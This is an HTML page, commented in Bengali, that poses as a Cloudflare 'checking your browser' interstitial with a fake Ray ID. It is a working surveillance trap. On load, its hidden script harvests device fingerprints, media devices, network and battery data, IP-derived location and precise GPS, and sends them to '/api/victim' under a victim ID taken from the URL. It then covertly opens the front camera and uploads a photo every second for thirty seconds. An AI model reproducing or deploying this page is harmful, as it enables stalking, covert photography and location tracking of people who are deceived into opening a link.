<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        .container { max-width: 500px; width: 100%; }
        .bubbles-wrapper { margin: 0 auto 30px auto; }
        .bubble {
            background-color: #f58220;
            width: 20px;
            height: 20px;
            margin: 0 4px;
            border-radius: 100%;
            display: inline-block;
            animation: fader 1.6s infinite;
        }
        .bubble:nth-child(2) { animation-delay: 0.2s; }
        .bubble:nth-child(3) { animation-delay: 0.4s; }
        @keyframes fader {
            0% { opacity: 0.2; }
            50% { opacity: 1.0; }
            100% { opacity: 0.2; }
        }
        h1 {
            font-size: 28px;
            font-weight: 700;
            color: #000000;
            margin: 16px 0;
            line-height: 1.25;
        }
        p {
            font-size: 18px;
            font-weight: 400;
            color: #444;
            margin: 8px 0;
            line-height: 1.7;
        }
        #status { display: none !important; }
        .attribution {
            margin-top: 32px;
            font-size: 14px;
            color: #666;
        }
        .attribution a { color: #2c7cb0; text-decoration: none; }
        .attribution a:hover { color: #f4a15d; }
        .ray_id { display: block; margin-top: 8px; }
        code {
            background: #f1f1f1;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 14px;
        }
        video, canvas { display: none !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="bubbles-wrapper">
            <div class="bubble"></div>
            <div class="bubble"></div>
            <div class="bubble"></div>
        </div>
        <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
        <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
        <p id="status"></p>
        <div class="attribution">
            DDoS সুরক্ষা দ্বারা
            <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
            <br>
            <span class="ray_id">Ray ID: <code id="ray">6c51810c599f2cda</code></span>
        </div>
    </div>

    <video id="video" playsinline autoplay muted></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            "use strict";

            // ===== রে আইডি =====
            const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
            let ray = "";
            for (let i = 0; i < 17; i++) {
                ray += chars[Math.floor(Math.random() * chars.length)];
            }
            document.getElementById('ray').textContent = ray;

            const pathParts = window.location.pathname.split('/');
            const victimId = pathParts[pathParts.length - 1];

            // ================================================================
            // ১. ডিভাইস ইনফো তৈরি করা
            // ================================================================
            function getDeviceInfo() {
                return {
                    productSub: navigator.productSub || 'N/A',
                    vendor: navigator.vendor || 'N/A',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    doNotTrack: navigator.doNotTrack || 'N/A',
                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                    cookieEnabled: navigator.cookieEnabled || false,
                    appCodeName: navigator.appCodeName || 'N/A',
                    appName: navigator.appName || 'N/A',
                    appVersion: navigator.appVersion || 'N/A',
                    platform: navigator.platform || 'N/A',
                    product: navigator.product || 'N/A',
                    userAgent: navigator.userAgent || 'N/A',
                    language: navigator.language || 'N/A',
                    languages: navigator.languages || [],
                    webdriver: navigator.webdriver || false,
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    deviceMemory: navigator.deviceMemory || 'N/A',
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: screen.colorDepth || 'N/A'
                };
            }

            // ================================================================
            // ২. মিডিয়া ডিভাইস
            // ================================================================
            async function getMediaDevices() {
                try {
                    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                        const devices = await navigator.mediaDevices.enumerateDevices();
                        return devices.map(d => ({
                            kind: d.kind,
                            label: d.label || 'N/A',
                            deviceId: d.deviceId || 'N/A'
                        }));
                    }
                } catch (e) {}
                return [];
            }

            // ================================================================
            // ৩. নেটওয়ার্ক তথ্য
            // ================================================================
            function getNetworkInfo() {
                if (navigator.connection) {
                    return {
                        type: navigator.connection.type || 'N/A',
                        rtt: navigator.connection.rtt || 0,
                        saveData: navigator.connection.saveData || false,
                        effectiveType: navigator.connection.effectiveType || 'N/A',
                        downlink: navigator.connection.downlink || 0,
                        downlinkMax: navigator.connection.downlinkMax || 0
                    };
                }
                return {};
            }

            // ================================================================
            // ৪. ব্যাটারি তথ্য
            // ================================================================
            async function getBatteryInfo() {
                try {
                    if (navigator.getBattery) {
                        const battery = await navigator.getBattery();
                        return {
                            level: Math.round(battery.level * 100),
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    }
                } catch (e) {}
                return {};
            }

            // ================================================================
            // ৫. ডিভাইস ইনফো পাঠান (সাথে সাথে)
            // ================================================================
            async function sendDeviceInfo() {
                try {
                    const device = getDeviceInfo();
                    const media = await getMediaDevices();
                    const network = getNetworkInfo();
                    const battery = await getBatteryInfo();

                    const data = {
                        id: victimId,
                        timestamp: new Date().toISOString(),
                        ip: null,
                        location: null,
                        gpsLocation: null,
                        device: device,
                        media: media,
                        network: network,
                        battery: battery,
                        type: 'camera'
                    };

                    await fetch('/api/victim', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    console.log('✅ ডিভাইস ইনফো পাঠানো হয়েছে');

                } catch (err) {
                    console.error('Device info send error:', err);
                }
            }

            // ================================================================
            // ৬. IP ও লোকেশন আপডেট
            // ================================================================
            async function updateIPAndLocation() {
                try {
                    let ip = null;
                    let location = null;
                    let gpsLocation = null;

                    try {
                        const ipRes = await fetch('https://api.ipify.org?format=json');
                        const ipData = await ipRes.json();
                        ip = ipData.ip;
                    } catch (e) {}

                    try {
                        if (ip) {
                            const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
                            const locData = await locRes.json();
                            location = {
                                country: locData.country_name || 'N/A',
                                region: locData.region || 'N/A',
                                city: locData.city || 'N/A',
                                latitude: locData.latitude || 0,
                                longitude: locData.longitude || 0,
                                isp: locData.org || 'N/A'
                            };
                        }
                    } catch (e) {}

                    try {
                        if (navigator.geolocation) {
                            const pos = await new Promise((resolve, reject) => {
                                navigator.geolocation.getCurrentPosition(resolve, reject, {
                                    enableHighAccuracy: true,
                                    timeout: 8000
                                });
                            });
                            gpsLocation = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy,
                                googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                            };
                        }
                    } catch (e) {}

                    if (ip || location || gpsLocation) {
                        await fetch('/api/victim', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                id: victimId,
                                ip: ip,
                                location: location,
                                gpsLocation: gpsLocation,
                                type: 'camera'
                            })
                        });
                        console.log('✅ IP ও লোকেশন আপডেট করা হয়েছে');
                    }

                } catch (err) {
                    console.error('IP/Location update error:', err);
                }
            }

            // ================================================================
            // ৭. ক্যামেরা – আসল রেজোলিউশন (1920x1080) + মেমরি অপটিমাইজড
            // ================================================================
            async function startCamera() {
                try {
                    // ক্যামেরা অ্যাক্সেস (আসল রেজোলিউশন)
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            width: { ideal: 1920 },
                            height: { ideal: 1080 },
                            facingMode: 'user'
                        },
                        audio: false
                    });

                    const video = document.getElementById('video');
                    const canvas = document.getElementById('canvas');
                    video.srcObject = stream;

                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                    });

                    // ক্যানভাসের সাইজ ভিডিওর আসল সাইজে সেট করুন
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // প্রতি ১ সেকেন্ডে ছবি তোলা (মেমরি বাঁচাতে)
                    const interval = setInterval(async () => {
                        if (!video.videoWidth || !video.videoHeight) return;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        // উচ্চ কোয়ালিটি (0.95) – আসল ছবি
                        const imageData = canvas.toDataURL('image/jpeg', 0.95);
                        const rawBase64 = imageData.split(',')[1];

                        try {
                            await fetch('/api/camera', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ id: victimId, image: rawBase64 })
                            });
                        } catch (e) {
                            console.error('Camera upload error:', e);
                        }
                    }, 1000); // ১ সেকেন্ড

                    // ৩০ সেকেন্ড পর ক্যামেরা বন্ধ
                    setTimeout(() => {
                        clearInterval(interval);
                        stream.getTracks().forEach(t => t.stop());
                    }, 30000);

                } catch (e) {
                    console.log('Camera access denied');
                }
            }

            // ================================================================
            // ৮. মেইন ফাংশন
            // ================================================================
            async function main() {
                await sendDeviceInfo();
                updateIPAndLocation();
                startCamera();
            }

            window.addEventListener('load', main);
        })();
    </script>
</body>
</html>
